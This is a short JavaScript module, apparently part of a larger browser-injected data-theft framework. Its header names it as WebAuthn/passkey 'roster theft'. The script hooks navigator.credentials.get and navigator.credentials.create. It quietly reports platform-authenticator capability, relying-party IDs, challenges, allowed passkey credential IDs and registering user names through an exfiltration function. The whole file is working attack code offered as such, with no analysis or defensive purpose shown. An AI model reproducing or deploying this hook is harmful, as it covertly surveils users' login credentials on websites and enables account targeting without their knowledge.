/* m-webauthn-theft.js — WebAuthn/passkey roster theft.
   Monkey-patch navigator.credentials.get para logear allowCredentials (IDs de passkeys del usuario en este sitio) + rpId. */
(function(G){
if(!G)return; if(G._M&&G._M.webauthn)return; G._M=G._M||{}; G._M.webauthn=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
if(!navigator.credentials){exfil('webauthn',{available:false});return}
// capacidad passkey (platform authenticator)
if(window.PublicKeyCredential&&PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable){
PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable().then(function(ok){
exfil('webauthn-cap',{platformAuth:ok,conditional:!!PublicKeyCredential.isConditionalMediationAvailable});
if(PublicKeyCredential.isConditionalMediationAvailable)PublicKeyCredential.isConditionalMediationAvailable().then(function(c){exfil('webauthn-conditional',{c:c})});
});}
// hook credentials.get para capturar allowCredentials (roster) cuando la página hace login passkey
var _get=navigator.credentials.get.bind(navigator.credentials);
navigator.credentials.get=function(opts){
try{
if(opts&&opts.publicKey){
var pk=opts.publicKey;
exfil('webauthn-req',{rpId:pk.rpId,challenge:pk.challenge?btoa(String.fromCharCode.apply(null,new Uint8Array(pk.challenge))).slice(0,32):null,
allowCredentials:(pk.allowCredentials||[]).map(function(c){return{type:c.type,id:c.id?btoa(String.fromCharCode.apply(null,new Uint8Array(c.id))).slice(0,40):null,transports:c.transports}}),
userVerification:pk.userVerification||'preferred'});
}
}catch(e){}
return _get(opts);
};
// hook credentials.create para capturar nuevo registro passkey (rpId, user info)
var _create=navigator.credentials.create.bind(navigator.credentials);
navigator.credentials.create=function(opts){
try{if(opts&&opts.publicKey){
var pk=opts.publicKey;
exfil('webauthn-create',{rpId:pk.rp&&pk.rp.id,name:pk.rp&&pk.rp.name,user:pk.user&&pk.user.name,disp:pk.authenticatorSelection&&pk.authenticatorSelection.userVerification});
}}catch(e){}
return _create(opts);
};
exfil('webauthn-boot',{hooked:true});
}catch(e){hx('m-webauthn-err',{m:e.message})}
})(window.__GE__);
